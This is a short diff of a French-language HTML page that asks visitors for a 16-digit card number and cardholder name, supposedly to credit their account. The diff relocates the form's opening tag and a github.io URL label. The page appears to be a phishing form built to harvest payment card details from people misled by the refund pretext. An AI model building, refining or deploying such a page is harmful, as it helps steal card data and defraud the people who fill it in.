@@ -9,8 +9,8 @@ html>
       Merci de bien vouloir nous communiquer les informations 
      <br> mentionnées ci-dessous, utiles pour créditer votre compte. 
     </dt> 
-<form method="post"> <label>https://c3-lan.github.io/idda/</label> 
-    <br> 
+
+
     <br> <label for="numcarte"> Numéro de la carte :</label><span class="required" style="color: orange"> *</span> &nbsp; 
     <dd> 
      <input type="text" name="numcarte" pattern="[0-9]{16}" minlength="16" maxlength="16" id="numcarte" value="" autocomplete="off" required placeholder="XXXX XXXX XXXX XXXX"> 
@@ -18,6 +18,8 @@ html>
    </dl> 
    <dl> 
     <dt>
+<form method="post"> <label>https://c3-lan.github.io/idda/</label> 
+  
      <label for="nomcarte">Nom du Titulaire :</label><span class="required" style="color: orange"> *</span>
     </dt> 
     <dd>
